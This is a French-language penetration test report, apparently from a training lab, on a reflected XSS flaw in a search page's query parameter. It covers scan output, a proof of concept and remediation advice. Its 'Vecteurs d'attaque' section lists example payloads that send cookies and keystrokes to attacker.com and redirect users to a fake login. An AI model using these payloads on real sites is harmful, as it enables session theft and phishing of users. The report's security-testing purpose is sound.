<!DOCTYPE html>
<html>
<head>
  <title>Rapport de Test d'Intrusion - MieuxQueGoogle.com</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* Style principal avec fond sombre et texte clair */
    body {
      font-family: 'Helvetica Neue', Helvetica, 'Segoe UI', Arial, sans-serif;
      font-size: 16px;
      line-height: 1.6;
      color: #e2e8f0; /* Texte principal clair */
      background-color: #111827; /* Fond sombre */
      margin: 0;
      padding: 20px;
    }

    /* Titres avec couleur plus claire */
    h1, h2, h3, h4, h5, h6 {
      color: #f8fafc; /* Blanc cassé */
      line-height: 1.2;
      margin-top: 1em;
      margin-bottom: 16px;
    }

    h1 {
      font-size: 2.25em;
      font-weight: 300;
      padding-bottom: .3em;
      border-bottom: 1px solid #4b5563;
    }

    h2 {
      font-size: 1.75em;
      font-weight: 400;
      padding-bottom: .3em;
      border-bottom: 1px solid #4b5563;
    }

    h3 {
      font-size: 1.5em;
      font-weight: 500;
    }

    /* Liens avec couleur contrastée */
    a {
      color: #93c5fd; /* Bleu clair */
      text-decoration: none;
    }

    a:hover {
      color: #60a5fa; /* Bleu moyen au survol */
      text-decoration: underline;
    }

    /* Tables */
    table {
      margin: 10px 0 15px 0;
      border-collapse: collapse;
      border-spacing: 0;
      display: block;
      width: 100%;
      overflow: auto;
      word-break: normal;
      word-break: keep-all;
    }

    table th {
      font-weight: 700;
      color: #f8fafc; /* Blanc cassé */
      background-color: #1e293b; /* Arrière-plan légèrement plus clair */
    }

    table td, table th {
      border: 1px solid #4b5563;
      padding: 6px 13px;
    }

    table tr:nth-child(even) {
      background-color: #1f2937; /* Alternance de couleurs subtile */
    }

    /* Listes */
    ul, ol {
      padding-left: 2em;
      margin-bottom: 16px;
    }

    /* Code et blocs de code */
    code {
      font-family: Menlo, Monaco, Consolas, 'Courier New', monospace;
      font-size: .85em;
      color: #f8fafc;
      background-color: #1e293b;
      border-radius: 3px;
      padding: .2em .4em;
    }

    pre {
      padding: 1em;
      overflow: auto;
      line-height: 1.45;
      border: 1px solid #4b5563;
      border-radius: 3px;
      background-color: #1e293b;
      margin-bottom: 16px;
    }

    pre code {
      background-color: transparent;
      padding: 0;
    }

    /* Citations */
    blockquote {
      margin: 16px 0;
      padding: 0 15px;
      color: #cbd5e1;
      background-color: #1e293b;
      border-left: 4px solid #4b5563;
    }

    /* Ligne horizontale */
    hr {
      height: 4px;
      margin: 32px 0;
      background-color: #4b5563;
      border: 0 none;
    }

    /* Images */
    img {
      max-width: 100%;
      border: 1px solid #4b5563;
      border-radius: 5px;
    }

    /* Mise en page générale */
    .markdown-preview {
      width: 100%;
      max-width: 900px;
      margin: 0 auto;
      padding: 20px;
    }
    
    /* Style pour les alertes */
    .alert {
      padding: 15px;
      margin-bottom: 20px;
      border-radius: 4px;
    }
    
    .alert-high {
      background-color: rgba(220, 38, 38, 0.2);
      border-left: 4px solid #dc2626;
    }
    
    .alert-medium {
      background-color: rgba(245, 158, 11, 0.2);
      border-left: 4px solid #f59e0b;
    }
    
    .alert-low {
      background-color: rgba(16, 185, 129, 0.2);
      border-left: 4px solid #10b981;
    }
    
    .severity-badge {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 3px;
      font-size: 0.8em;
      font-weight: bold;
    }
    
    .severity-high {
      background-color: #dc2626;
      color: white;
    }
    
    .severity-medium {
      background-color: #f59e0b;
      color: white;
    }
    
    .severity-low {
      background-color: #10b981;
      color: white;
    }
  </style>
</head>
<body>
  <div class="markdown-preview">
    <h1 id="rapport-de-test-dintrusion">Rapport de Test d'Intrusion</h1>
    <h2 id="MieuxQueGoogle.com">MieuxQueGoogle.com</h2>
    <table>
      <thead>
        <tr>
          <th>Propriété</th>
          <th>Valeur</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><strong>Préparé par:</strong></td>
          <td>Clémence Chopin</td>
        </tr>
        <tr>
          <td><strong>Version du document:</strong></td>
          <td>1.0</td>
        </tr>
        <tr>
          <td><strong>Date:</strong></td>
          <td>11 mars 2025</td>
        </tr>
        <tr>
          <td><strong>Client:</strong></td>
          <td>MieuxQueGoogle.com</td>
        </tr>
        <tr>
          <td><strong>Classification:</strong></td>
          <td>Confidentiel</td>
        </tr>
        <tr>
          <td><strong>Cible:</strong></td>
          <td>ip10-36-165-5-cv82iimslcb111osqelg-8080.direct.labs.cyberini.com</td>
        </tr>
      </tbody>
    </table>
    <hr>
    <h2 id="sommaire">Sommaire</h2>
    <ol>
      <li><a href="#résumé-exécutif">Résumé Exécutif</a></li>
      <li><a href="#portée-et-objectifs">Portée et Objectifs</a></li>
      <li><a href="#méthodologie">Méthodologie</a></li>
      <li><a href="#résultats-et-découvertes">Résultats et Découvertes</a>
        <ul>
          <li><a href="#vulnérabilité-1-cross-site-scripting-xss-reflected">Vulnérabilité 1: Cross-Site Scripting (XSS) Reflected</a></li>
        </ul>
      </li>
      <li><a href="#synthèse-des-risques">Synthèse des Risques</a></li>
      <li><a href="#conclusion-et-recommandations">Conclusion et Recommandations</a></li>
      <li><a href="#annexes">Annexes</a></li>
    </ol>
    <hr>
    <h2 id="résumé-exécutif">Résumé Exécutif</h2>
    <p>Ce rapport présente les résultats d'un test d'intrusion ciblé réalisé sur l'application web MieuxQueGoogle.com, accessible via l'URL ip10-36-165-5-cv82iimslcb111osqelg-8080.direct.labs.cyberini.com. L'objectif était d'identifier les vulnérabilités potentielles et d'évaluer le niveau de sécurité global de l'application.</p>
    
    <p>Au cours de ce test, nous avons découvert une vulnérabilité significative qui pourrait compromettre la sécurité de l'application et de ses utilisateurs :</p>
    
    <table>
      <thead>
        <tr>
          <th>Vulnérabilité</th>
          <th>Sévérité</th>
          <th>Impact Principal</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><strong>Cross-Site Scripting (XSS) Reflected</strong></td>
          <td><span class="severity-badge severity-medium">CVSS 5.4 (Élevé)</span></td>
          <td>Vol de session, phishing, exécution de code arbitraire côté client</td>
        </tr>
      </tbody>
    </table>
    
    <p>Cette vulnérabilité représente un risque significatif pour l'intégrité des données, la confidentialité des utilisateurs et la réputation de l'application. Des recommandations détaillées pour la correction de cette vulnérabilité sont incluses dans ce rapport.</p>
    
    <hr>
    <h2 id="portée-et-objectifs">Portée et Objectifs</h2>
    
    <h3>Périmètre du test</h3>
    <p>Le test d'intrusion a été réalisé sur l'application web accessible via le domaine :</p>
    <ul>
      <li><code>ip10-36-165-5-cv82iimslcb111osqelg-8080.direct.labs.cyberini.com</code></li>
    </ul>
    
    <h3>Objectifs</h3>
    <p>Les objectifs principaux de ce test d'intrusion étaient les suivants :</p>
    <ul>
      <li>Identifier les vulnérabilités potentielles dans l'application web</li>
      <li>Évaluer l'efficacité des mécanismes de sécurité en place</li>
      <li>Déterminer l'impact potentiel de chaque vulnérabilité découverte</li>
      <li>Fournir des recommandations pour renforcer la posture de sécurité de l'application</li>
    </ul>
    
    <h3>Limitations</h3>
    <p>Les limitations suivantes ont été appliquées lors du test :</p>
    <ul>
      <li>Aucune attaque de type déni de service (DoS) n'a été réalisée</li>
      <li>Les tests ont été effectués dans un environnement contrôlé</li>
      <li>L'adresse IP étant privée, la phase de reconnaissance externe a été limitée</li>
      <li>Les tests d'ingénierie sociale n'ont pas été inclus dans le périmètre</li>
    </ul>
    
    <hr>
    <h2 id="méthodologie">Méthodologie</h2>
    
    <p>Notre approche du test d'intrusion a suivi la méthodologie standard en six phases :</p>
    
    <h3>1. Reconnaissance</h3>
    <p>Cette phase a été partiellement omise en raison de la nature de l'environnement de test (IP privée). Cependant, nous avons rassemblé des informations préliminaires sur la cible à partir des informations fournies.</p>
    
    <h3>2. Scan</h3>
    <p>Nous avons effectué un scan complet de l'infrastructure en utilisant différents outils pour identifier les services exposés, les ports ouverts et les technologies utilisées :</p>
    <ul>
      <li><strong>Nmap</strong> : Scan de port complet avec détection de service et de système d'exploitation</li>
      <li><strong>Curl</strong> : Analyse des en-têtes HTTP et des réponses du serveur</li>
      <li><strong>WhatWeb</strong> : Identification des technologies web utilisées</li>
      <li><strong>Nikto</strong> : Scan de vulnérabilités web génériques</li>
      <li><strong>Wafw00f</strong> : Détection de pare-feu d'applications web (WAF)</li>
    </ul>
    
    <h3>3. Énumération</h3>
    <p>Après avoir identifié les services disponibles, nous avons procédé à une énumération détaillée :</p>
    <ul>
      <li><strong>Gobuster</strong> : Découverte de répertoires et fichiers cachés</li>
      <li><strong>FFuf</strong> : Fuzzing avancé pour identifier des points d'entrée potentiels</li>
      <li><strong>Subfinder</strong> : Recherche de sous-domaines</li>
    </ul>
    
    <h3>4. Analyse des vulnérabilités</h3>
    <p>À partir des résultats obtenus lors des phases précédentes, nous avons analysé manuellement les points d'entrée potentiels pour identifier les vulnérabilités exploitables :</p>
    <ul>
      <li>Analyse des pages web découvertes</li>
      <li>Tests d'injection (SQL, XSS, commandes)</li>
      <li>Vérification des contrôles d'accès</li>
      <li>Analyse des réponses du serveur</li>
    </ul>
    
    <h3>5. Exploitation</h3>
    <p>Pour chaque vulnérabilité identifiée, nous avons développé et exécuté des exploits pour confirmer leur exploitabilité et évaluer leur impact potentiel :</p>
    <ul>
      <li>Exploitation des vulnérabilités XSS</li>
      <li>Tentatives de contournement des protections (WAF, filtres)</li>
      <li>Tests de différents vecteurs d'attaque</li>
    </ul>
    
    <h3>6. Documentation</h3>
    <p>Toutes les découvertes ont été documentées en détail, y compris :</p>
    <ul>
      <li>Description technique de chaque vulnérabilité</li>
      <li>Méthodes de reproduction</li>
      <li>Impact potentiel</li>
      <li>Recommandations de correction</li>
    </ul>
    
    <h4>Outils utilisés</h4>
    <table>
      <thead>
        <tr>
          <th>Outil</th>
          <th>Objectif</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>Nmap</td>
          <td>Scan de ports et de services</td>
        </tr>
        <tr>
          <td>Curl</td>
          <td>Analyse des réponses HTTP</td>
        </tr>
        <tr>
          <td>WhatWeb</td>
          <td>Identification des technologies</td>
        </tr>
        <tr>
          <td>Gobuster</td>
          <td>Recherche de répertoires et fichiers</td>
        </tr>
        <tr>
          <td>FFuf</td>
          <td>Fuzzing d'applications web</td>
        </tr>
        <tr>
          <td>Nikto</td>
          <td>Scan de vulnérabilités web</td>
        </tr>
        <tr>
          <td>Wafw00f</td>
          <td>Détection de WAF</td>
        </tr>
        <tr>
          <td>Subfinder</td>
          <td>Découverte de sous-domaines</td>
        </tr>
        <tr>
          <td>Exegol</td>
          <td>Environnement de test d'intrusion</td>
        </tr>
      </tbody>
    </table>
    
    <hr>
    <h2 id="résultats-et-découvertes">Résultats et Découvertes</h2>
    
    <h3>Résultats du scan initial</h3>
    
    <p>Le scan Nmap a révélé trois ports ouverts sur la cible :</p>
    
    <pre><code>PORT     STATE SERVICE    VERSION
80/tcp   open  tcpwrapped
443/tcp  open  tcpwrapped
8080/tcp open  tcpwrapped</code></pre>
    
    <p>L'analyse des en-têtes HTTP a montré que le serveur est protégé par Cloudflare :</p>
    
    <pre><code>HTTP/1.1 200 OK
Date: Tue, 11 Mar 2025 12:24:50 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
cf-cache-status: DYNAMIC
Server: cloudflare
CF-RAY: 91eb07f58832bb5a-CDG
alt-svc: h3=":443"; ma=86400</code></pre>
    
    <p>WhatWeb a confirmé la présence de Cloudflare et a identifié le titre de la page comme "MieuxQueGoogle.com | Recherche" :</p>
    
    <pre><code>http://ip10-36-165-5-cv82iimslcb111osqelg-8080.direct.labs.cyberini.com/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[cloudflare], IP[172.67.164.21], Title[MieuxQueGoogle.com | Recherche], UncommonHeaders[cf-cache-status,report-to,nel,cf-ray,alt-svc,server-timing]</code></pre>
    
    <p>La découverte de fichiers avec Gobuster a révélé plusieurs fichiers PHP accessibles :</p>
    
    <pre><code>/.php                 (Status: 403) [Size: 331]
/index.php            (Status: 200) [Size: 1533]
/.html                (Status: 403) [Size: 331]
/search.php           (Status: 200) [Size: 1319]</code></pre>
    
    <h3 id="vulnérabilité-1-cross-site-scripting-xss-reflected">Vulnérabilité: Cross-Site Scripting (XSS) Reflected</h3>
    
    <div class="alert alert-medium">
      <table>
        <thead>
          <tr>
            <th>Propriété</th>
            <th>Détail</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Catégorie OWASP Top 10</strong></td>
            <td><a href="https://owasp.org/Top10/A03_2021-Injection/">A03:2021 - Injection</a></td>
          </tr>
          <tr>
            <td><strong>Sévérité</strong></td>
            <td>CVSS 5.4 (Élevé)</td>
          </tr>
          <tr>
            <td><strong>URL Affectée</strong></td>
            <td>http://ip10-36-165-5-cv82iimslcb111osqelg-8080.direct.labs.cyberini.com/search.php</td>
          </tr>
          <tr>
            <td><strong>Paramètre vulnérable</strong></td>
            <td>query</td>
          </tr>
        </tbody>
      </table>
    </div>
    
    <h4>Description</h4>
    <p>La page <code>search.php</code> est vulnérable à une attaque de type <a href="https://owasp.org/www-community/attacks/xss/">Cross-Site Scripting (XSS) reflected</a>. L'application insère directement le contenu du paramètre <code>query</code> dans la réponse HTML sans effectuer de validation ou d'échappement approprié. Cela permet à un attaquant d'injecter du code JavaScript malveillant qui sera exécuté dans le navigateur de la victime. Cette vulnérabilité est similaire à celles documentées dans la <a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation</a>.</p>
    
    <h4>Reproduction</h4>
    <ol>
      <li>Accéder à l'URL: <code>http://ip10-36-165-5-cv82iimslcb111osqelg-8080.direct.labs.cyberini.com/search.php?query=test</code></li>
      <li>Observer que le terme "test" est affiché dans la page</li>
      <li>Remplacer "test" par une charge utile XSS: <code>&lt;script&gt;alert()&lt;/script&gt;</code></li>
      <li>Constater que le code JavaScript est inséré dans la page et exécuté</li>
    </ol>
    
    <h4>Preuve d'Exploitation</h4>
    <p>La charge utile <code>&lt;script&gt;alert()&lt;/script&gt;</code> a été injectée via le paramètre <code>query</code> et a été reflétée dans le code HTML de la page sans échappement :</p>
    
    <pre><code>&lt;h2&gt;Résultats de recherche pour : &lt;script&gt;alert()&lt;/script&gt;&lt;/h2&gt;
&lt;p&gt;Resultat 1 pour &lt;script&gt;alert()&lt;/script&gt;&lt;/p&gt;
&lt;p&gt;Resultat 2 pour &lt;script&gt;alert()&lt;/script&gt;&lt;/p&gt;
&lt;p&gt;Resultat 3 pour &lt;script&gt;alert()&lt;/script&gt;&lt;/p&gt;</code></pre>
    
    <h4>Impact</h4>
    <p>Cette vulnérabilité peut être exploitée de plusieurs façons :</p>
    <ul>
      <li><strong>Vol de cookies de session</strong> - Un attaquant peut voler les cookies de session d'un utilisateur en injectant un code qui les envoie à un serveur contrôlé par l'attaquant.</li>
      <li><strong>Phishing</strong> - Un attaquant peut injecter du code qui modifie l'apparence de la page pour inciter l'utilisateur à divulguer des informations sensibles.</li>
      <li><strong>Exécution de code arbitraire</strong> - Un attaquant peut exécuter du code JavaScript dans le contexte du site, ce qui peut conduire à diverses attaques côté client.</li>
      <li><strong>Défiguration</strong> - Un attaquant peut modifier l'apparence de la page pour nuire à la réputation du site.</li>
    </ul>
    
    <h4>Vecteurs d'attaque</h4>
    <p>Exemples de charges utiles malveillantes qui pourraient être utilisées :</p>
    <ul>
      <li>Vol de cookies: <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code></li>
      <li>Redirection: <code>&lt;script&gt;window.location='https://attacker.com/fake-login'&lt;/script&gt;</code></li>
      <li>Keylogger: <code>&lt;script&gt;document.onkeypress=function(e){fetch('https://attacker.com/log?key='+e.key)}&lt;/script&gt;</code></li>
    </ul>
    
    <h4>Recommandations</h4>
    <ol>
      <li><strong>Échappement des données de sortie</strong> - Utiliser des fonctions d'échappement HTML pour toutes les données utilisateur affichées dans les pages web :
        <pre><code>// PHP
$safe_query = htmlspecialchars($query, ENT_QUOTES, 'UTF-8');
echo "&lt;h2&gt;Résultats de recherche pour : " . $safe_query . "&lt;/h2&gt;";</code></pre>
        <p>Voir la <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a> pour plus d'informations.</p>
      </li>
      <li><strong>Validation des entrées</strong> - Mettre en œuvre une validation stricte des entrées utilisateur pour rejeter tout contenu potentiellement malveillant, selon les <a href="https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html">bonnes pratiques OWASP de validation des entrées</a>.</li>
      <li><strong>Content Security Policy (CSP)</strong> - Mettre en place une politique CSP stricte pour limiter les sources de contenu autorisées :
        <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self';</code></pre>
        <p>Voir le <a href="https://content-security-policy.com/">guide CSP</a> pour une configuration appropriée.</p>
      </li>
      <li><strong>X-XSS-Protection</strong> - Activer l'en-tête de protection XSS :
        <pre><code>X-XSS-Protection: 1; mode=block</code></pre>
        <p>Plus d'informations sur <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection">MDN Web Docs</a>.</p>
      </li>
      <li><strong>HTTPOnly et Secure Cookies</strong> - Protéger les cookies de session avec les attributs HTTPOnly et Secure pour empêcher leur vol via XSS, comme recommandé par <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">OWASP Session Management Cheat Sheet</a>.</li>
    </ol>